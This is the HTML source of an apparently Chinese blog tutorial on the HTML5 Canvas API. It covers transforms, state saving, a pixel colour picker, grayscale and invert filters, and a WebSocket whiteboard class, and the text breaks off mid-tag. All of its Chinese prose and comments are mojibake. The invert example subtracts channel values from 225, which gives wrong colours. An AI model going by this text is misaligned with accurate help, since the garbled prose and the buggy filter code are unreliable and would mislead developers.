åœ¨æŒ‡å®šçš„(x,y)ä½ç½®ç»˜åˆ¶æŒ‡å®šæ–‡æœ¬ï¼Œç»˜åˆ¶çš„æœ€å¤§å®½åº¦å¯é€‰</span><br><span class="line"></span><br><span class="line"><span class="comment">// é¢„æµ‹é‡æ–‡æœ¬å®½åº¦</span></span><br><span class="line"><span class="keyword">var</span> text = ctx.measureText(<span class="string">'foo'</span>);</span><br><span class="line">text.width <span class="comment">// 16</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drawImage(image, x, y)                                              ç»˜åˆ¶å›¾ç‰‡</span><br><span class="line">drawImage(image, x, y, width, height)                               ç»˜åˆ¶å›¾ç‰‡(ç¼©æ”¾)</span><br><span class="line">drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight3) åˆ‡ç‰‡</span><br></pre></td></tr></table></figure><p><img src="/2018/10/06/Canvasæ–‡æ¡£/3.jpg" style="padding-top:20px; max-width: 380px"><br><br></p><h3 id="5-å˜å½¢"><a href="#5-å˜å½¢" class="headerlink" title="5. å˜å½¢"></a>5. å˜å½¢</h3><h4 id="5-1-çŠ¶æ€çš„ä¿å­˜å’Œæ¢å¤"><a href="#5-1-çŠ¶æ€çš„ä¿å­˜å’Œæ¢å¤" class="headerlink" title="5.1 çŠ¶æ€çš„ä¿å­˜å’Œæ¢å¤"></a>5.1 çŠ¶æ€çš„ä¿å­˜å’Œæ¢å¤</h4><p>CanvasçŠ¶æ€å­˜å‚¨åœ¨æ ˆä¸­ï¼Œæ¯å½“<code>save()</code>æ–¹æ³•è¢«è°ƒç”¨åï¼Œå½“å‰çš„çŠ¶æ€å°±è¢«æ¨é€åˆ°æ ˆä¸­ã€‚ä½ å¯ä»¥è°ƒç”¨ä»»æ„å¤šæ¬¡<code>save</code>æ–¹æ³•ï¼Œæ¯ä¸€æ¬¡è°ƒç”¨<code>restore</code>æ–¹æ³•ï¼Œä¸Šä¸€ä¸ªä¿å­˜çš„çŠ¶æ€å°±ä»æ ˆä¸­å¼¹å‡ºï¼Œæ‰€æœ‰è®¾å®šéƒ½æ¢å¤ã€‚</p><p>ä¸€ä¸ªç»˜ç”»çŠ¶æ€åŒ…æ‹¬ï¼šâ‘ å½“å‰åº”ç”¨çš„å˜å½¢(ç§»åŠ¨ã€æ—‹è½¬ã€ç¼©æ”¾)ï¼›â‘¡strokeStyle, fillStyle, globalAlpha, lineWidth, lineCap, lineJoin, miterLimit, shadowOffsetX, shadowOffsetY, shadowBlur, shadowColor, globalCompositeOperation çš„å€¼ï¼› â‘¢å½“å‰çš„è£åˆ‡è·¯å¾„<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.save()    ä¿å­˜canvasçŠ¶æ€</span><br><span class="line">ctx.restore() æ¢å¤canvasçŠ¶æ€</span><br></pre></td></tr></table></figure></p><h4 id="5-2-ç§»åŠ¨ï¼Œæ—‹è½¬ï¼Œå˜å½¢ï¼Œç¼©æ”¾"><a href="#5-2-ç§»åŠ¨ï¼Œæ—‹è½¬ï¼Œå˜å½¢ï¼Œç¼©æ”¾" class="headerlink" title="5.2 ç§»åŠ¨ï¼Œæ—‹è½¬ï¼Œå˜å½¢ï¼Œç¼©æ”¾"></a>5.2 ç§»åŠ¨ï¼Œæ—‹è½¬ï¼Œå˜å½¢ï¼Œç¼©æ”¾</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx.translate(x, y)   [ç§»åŠ¨]ç§»åŠ¨canvaså’Œå®ƒçš„åŸç‚¹åˆ°ä¸€ä¸ªä¸åŒçš„ä½ç½®</span><br><span class="line">ctx.rotate(angle)     [æ—‹è½¬]ä»¥åŸç‚¹ä¸ºä¸­å¿ƒæ—‹è½¬canvas</span><br><span class="line">ctx.scale(x, y)       [ç¼©æ”¾]å¯¹å½¢çŠ¶ï¼Œä½å›¾è¿›è¡Œç¼©å°æˆ–è€…æ”¾å¤§ï¼Œx, yé»˜è®¤å€¼ä¸º<span class="number">1</span></span><br><span class="line">ctx.transform(m11, m12, m21, m22, dx, dy) [å˜å½¢]</span><br><span class="line">ctx.transform(æ°´å¹³æ–¹å‘çš„ç¼©æ”¾ï¼Œæ°´å¹³æ–¹å‘çš„å€¾æ–œåç§»ï¼Œç«–ç›´æ–¹å‘çš„ç¼©æ”¾ï¼Œç«–ç›´æ–¹å‘çš„å€¾æ–œåç§»ï¼Œæ°´å¹³æ–¹å‘çš„ç§»åŠ¨ï¼Œç«–ç›´æ–¹å‘çš„ç§»åŠ¨)</span><br></pre></td></tr></table></figure><p><img src="/2018/10/06/Canvasæ–‡æ¡£/4.png" style="padding-top:20px; max-width: 380px"></p><p><br></p><h3 id="6-å…¶å®ƒ"><a href="#6-å…¶å®ƒ" class="headerlink" title="6. å…¶å®ƒ"></a>6. å…¶å®ƒ</h3><h4 id="6-1-åŠ¨ç”»"><a href="#6-1-åŠ¨ç”»" class="headerlink" title="6.1 åŠ¨ç”»"></a>6.1 åŠ¨ç”»</h4><p>ä¿å­˜canvasçŠ¶æ€, æ¸…ç©ºcanvas, é‡ç»˜åŠ¨ç”»å¸§ã€‚<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API/Tutorial/Advanced_animations" target="_blank" rel="noopener">é«˜çº§åŠ¨ç”»ç¤ºä¾‹</a></p><h4 id="6-2-é¢œè‰²é€‰æ‹©å™¨"><a href="#6-2-é¢œè‰²é€‰æ‹©å™¨" class="headerlink" title="6.2 é¢œè‰²é€‰æ‹©å™¨"></a>6.2 é¢œè‰²é€‰æ‹©å™¨</h4><p>åƒç´ æ“ä½œ: <code>ctx.getImageData(left, top, width, height)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">'https://mdn.mozillademos.org/files/5397/rhino.jpg'</span>;</span><br><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line"><span class="keyword">var</span> ctx = canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ctx.drawImage(img, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  img.style.display = <span class="string">'none'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> color = <span class="built_in">document</span>.getElementById(<span class="string">'color'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pick</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = event.layerX;</span><br><span class="line">  <span class="keyword">var</span> y = event.layerY;</span><br><span class="line">  <span class="keyword">var</span> pixel = ctx.getImageData(x, y, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> data = pixel.data;</span><br><span class="line">  <span class="keyword">var</span> rgba = <span class="string">'rgba('</span> + data[<span class="number">0</span>] + <span class="string">','</span> + data[<span class="number">1</span>] +</span><br><span class="line">             <span class="string">','</span> + data[<span class="number">2</span>] + <span class="string">','</span> + (data[<span class="number">3</span>] / <span class="number">255</span>) + <span class="string">')'</span>;</span><br><span class="line">  color.style.background =  rgba;</span><br><span class="line">  color.textContent = rgba;</span><br><span class="line">&#125;</span><br><span class="line">canvas.addEventListener(<span class="string">'mousemove'</span>, pick);</span><br></pre></td></tr></table></figure></p><h4 id="6-3-å›¾ç‰‡ç°åº¦å’Œåç›¸é¢œè‰²"><a href="#6-3-å›¾ç‰‡ç°åº¦å’Œåç›¸é¢œè‰²" class="headerlink" title="6.3 å›¾ç‰‡ç°åº¦å’Œåç›¸é¢œè‰²"></a>6.3 å›¾ç‰‡ç°åº¦å’Œåç›¸é¢œè‰²</h4><p>åœ¨åœºæ™¯ä¸­å†™å…¥åƒç´ æ•°æ®: <code>ctx.putImageData(myImageData, dx, dy)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">'https://mdn.mozillademos.org/files/5397/rhino.jpg'</span>;</span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  draw(<span class="keyword">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params">img</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line">  <span class="keyword">var</span> ctx = canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">  ctx.drawImage(img, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  img.style.display = <span class="string">'none'</span>;</span><br><span class="line">  <span class="keyword">var</span> imageData = ctx.getImageData(<span class="number">0</span>,<span class="number">0</span>,canvas.width, canvas.height);</span><br><span class="line">  <span class="keyword">var</span> data = imageData.data;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">var</span> invert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">4</span>) &#123;</span><br><span class="line">      data[i]     = <span class="number">225</span> - data[i];     <span class="comment">// red</span></span><br><span class="line">      data[i + <span class="number">1</span>] = <span class="number">225</span> - data[i + <span class="number">1</span>]; <span class="comment">// green</span></span><br><span class="line">      data[i + <span class="number">2</span>] = <span class="number">225</span> - data[i + <span class="number">2</span>]; <span class="comment">// blue</span></span><br><span class="line">    &#125;</span><br><span class="line">    ctx.putImageData(imageData, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> grayscale = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> avg = (data[i] + data[i +<span class="number">1</span>] + data[i +<span class="number">2</span>]) / <span class="number">3</span>;</span><br><span class="line">      data[i]     = avg; <span class="comment">// red</span></span><br><span class="line">      data[i + <span class="number">1</span>] = avg; <span class="comment">// green</span></span><br><span class="line">      data[i + <span class="number">2</span>] = avg; <span class="comment">// blue</span></span><br><span class="line">    &#125;</span><br><span class="line">    ctx.putImageData(imageData, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> invertbtn = <span class="built_in">document</span>.getElementById(<span class="string">'invertbtn'</span>);</span><br><span class="line">  invertbtn.addEventListener(<span class="string">'click'</span>, invert);</span><br><span class="line">  <span class="keyword">var</span> grayscalebtn = <span class="built_in">document</span>.getElementById(<span class="string">'grayscalebtn'</span>);</span><br><span class="line">  grayscalebtn.addEventListener(<span class="string">'click'</span>, grayscale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="6-4-æŠŠcanvasä¿å­˜ä¸ºå›¾ç‰‡"><a href="#6-4-æŠŠcanvasä¿å­˜ä¸ºå›¾ç‰‡" class="headerlink" title="6.4 æŠŠcanvasä¿å­˜ä¸ºå›¾ç‰‡"></a>6.4 æŠŠcanvasä¿å­˜ä¸ºå›¾ç‰‡</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">canvas.toDataURL(<span class="string">'image/png'</span>, quality)        åˆ›å»ºä¸€ä¸ªpngå›¾ç‰‡,<span class="number">0</span><span class="number">-1</span>çš„å“è´¨é‡,<span class="number">1</span>æœ€å¥½</span><br><span class="line">canvas.toBlob(callback, type, encoderOptions) åˆ›å»ºä¸€ä¸ªç”»å¸ƒä¸­ä»£è¡¨å›¾ç‰‡çš„Blobå¯¹è±¡</span><br></pre></td></tr></table></figure><h4 id="6-5-websocketå®ç°ç™½æ¿åŠŸèƒ½"><a href="#6-5-websocketå®ç°ç™½æ¿åŠŸèƒ½" class="headerlink" title="6.5 websocketå®ç°ç™½æ¿åŠŸèƒ½"></a>6.5 websocketå®ç°ç™½æ¿åŠŸèƒ½</h4><ul><li>ç»˜åˆ¶çº¿æ¡ï¼Œç›´çº¿ï¼Œæ¤­åœ†ï¼ŒçŸ©å½¢(å¯é€‰æ‹©ç”»ç¬”ç²—ç»†ï¼Œçº¿æ¡é¢œè‰²ï¼Œå¡«å……é¢œè‰²)</li><li>å†™å­—ï¼Œè¾“å…¥æ¡†ä¸­è¾“å…¥ç¡®å®šåæ˜¾ç¤ºåœ¨ç”»å¸ƒä¸Š</li><li>æ©¡çš®æª«ï¼Œæ¸…ç©ºç”»å¸ƒ</li><li>æ’¤é”€ï¼Œæ¢å¤åŠŸèƒ½(å†æ‰§è¡Œæœ€è¿‘ä¸€æ¬¡æ“ä½œ)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">repaint</span>(<span class="params">ctx, strokes</span>) </span>&#123;</span><br><span class="line">  ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, ctx.canvas.width, ctx.canvas.height);</span><br><span class="line">  <span class="keyword">if</span> (strokes === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  strokes.map(<span class="function">(<span class="params">stroke</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; strokeColor, width, graphType &#125; = stroke;</span><br><span class="line">    ctx.strokeStyle = strokeColor;</span><br><span class="line">    ctx.lineWidth = width;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> startX = stroke.data[<span class="number">0</span>].x;</span><br><span class="line">    <span class="keyword">const</span> startY = stroke.data[<span class="number">0</span>].y;</span><br><span class="line">    <span class="keyword">const</span> &#123; x, y &#125; = stroke.data[stroke.data.length - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    <span class="keyword">if</span> (graphType === <span class="string">'pencil'</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stroke.data.length; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> prev = stroke.data[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">const</span> current = stroke.data[i];</span><br><span class="line">        <span class="keyword">if</span> (prev !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">          ctx.moveTo(prev.x, prev.y);</span><br><span class="line">        &#125;</span><br><span class="line">        ctx.lineTo(current.x, current.y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'line'</span>) &#123;</span><br><span class="line">      ctx.moveTo(startX, startY);</span><br><span class="line">      ctx.lineTo(x, y);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'circle'</span>) &#123;</span><br><span class="line">      <span class="comment">// const radii = Math.sqrt((startX - x) * (startX - x) + (startY - y) * (startY - y));</span></span><br><span class="line">      <span class="comment">// ctx.arc(startX, startY, radii, 0, Math.PI * 2, false);</span></span><br><span class="line">      <span class="comment">// æ¤­åœ†</span></span><br><span class="line">      ctx.save();</span><br><span class="line">      <span class="keyword">const</span> o1 = (startX + x) / <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">const</span> o2 = (startY + y) / <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">const</span> a = <span class="built_in">Math</span>.abs((x - startX) / <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">const</span> b = <span class="built_in">Math</span>.abs((y - startY) / <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">const</span> r = (a &gt; b) ? a : b;</span><br><span class="line">      <span class="keyword">const</span> ratioX = a / r;</span><br><span class="line">      <span class="keyword">const</span> ratioY = b / r;</span><br><span class="line">      ctx.scale(ratioX, ratioY);</span><br><span class="line">      ctx.arc(o1 / ratioX, o2 / ratioY, r, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI, <span class="literal">false</span>);</span><br><span class="line">      ctx.restore();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'square'</span>) &#123;</span><br><span class="line">      ctx.moveTo(startX, startY);</span><br><span class="line">      ctx.lineTo(x, startY);</span><br><span class="line">      ctx.lineTo(x, y);</span><br><span class="line">      ctx.lineTo(startX, y);</span><br><span class="line">      ctx.lineTo(startX, startY);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stroke.data.length; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; x, y &#125; = stroke.data[i];</span><br><span class="line">        <span class="comment">// æ“ä½œæ¸…é™¤åƒç´ </span></span><br><span class="line">        <span class="keyword">const</span> size = <span class="number">2</span>;</span><br><span class="line">        ctx.strokeStyle = <span class="string">'#000000'</span>;</span><br><span class="line">        ctx.clearRect(x - size * <span class="number">10</span> ,  y - size * <span class="number">10</span> , size * <span class="number">20</span> , size * <span class="number">20</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">      ctx.font = <span class="string">"16px Microsoft YaHei"</span>;</span><br><span class="line">      ctx.fillStyle = strokeColor;</span><br><span class="line">      ctx.fillText(stroke.text, startX, startY);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.closePath();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">WhiteBoard</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(options) &#123;</span><br><span class="line">    <span class="keyword">this</span>.canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line">    <span class="keyword">this</span>.ctx = <span class="keyword">this</span>.canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">    <span class="keyword">this</span>.isDrawing = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.strokeColor = <span class="string">'#000'</span>;</span><br><span class="line">    <span class="keyword">this</span>.lineWidth = <span class="number">2</span>; <span class="comment">// çº¿çš„å®½åº¦</span></span><br><span class="line">    <span class="keyword">this</span>.graphType = <span class="string">'pencil'</span>;</span><br><span class="line">    <span class="keyword">this</span>.strokes = [];</span><br><span class="line">    <span class="keyword">this</span>.redo = [];</span><br><span class="line">    <span class="keyword">this</span>.textSite = &#123;&#125;;</span><br><span class="line">    <span class="keyword">const</span> &#123; wid, token &#125; = options;</span><br><span class="line">    <span class="keyword">const</span> ws = <span class="string">`ws://live.ngrok.elitemc.cn:8000/ws/whiteboard-<span class="subst">$&#123;wid&#125;</span>?token=<span class="subst">$&#123;token&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">this</span>.socket = <span class="keyword">new</span> WebSocket(ws);</span><br><span class="line">    <span class="keyword">this</span>.init();</span><br><span class="line">  &#125;</span><br><span class="line">  init = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; canvas, ctx &#125; = <span class="keyword">this</span>;</span><br><span class="line">    canvas.onmousedown = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.isDrawing = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">const</span> x = event.clientX - canvas.getBoundingClientRect().x;</span><br><span class="line">      <span class="keyword">const</span> y = event.clientY - canvas.getBoundingClientRect().y;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// åœ¨è¯¥åæ ‡ä¸Šè®¾ç½®æ–‡æœ¬æ¡†</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.showTextBox(x, y);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.addPoint(x, y, <span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœæ˜¯æ©¡çš®æª«ï¼Œæ¸…ç©ºç”»å¸ƒï¼Œé‡ç»˜ï¼Œæ˜¾ç¤ºæ©¡çš®æª«</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.showRubber(x, y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmousemove = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> x = event.clientX - canvas.getBoundingClientRect().x;</span><br><span class="line">      <span class="keyword">const</span> y = event.clientY - canvas.getBoundingClientRect().y;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// è®°å½•æ“ä½œ,å¹¶é‡ç»˜</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.isDrawing) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addPoint(x, y);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœæ˜¯æ©¡çš®æª«ï¼Œæ¸…ç©ºç”»å¸ƒï¼Œé‡ç»˜ï¼Œæ˜¾ç¤ºæ©¡çš®æª«</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.showRubber(x, y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmouseup = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.isDrawing = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span 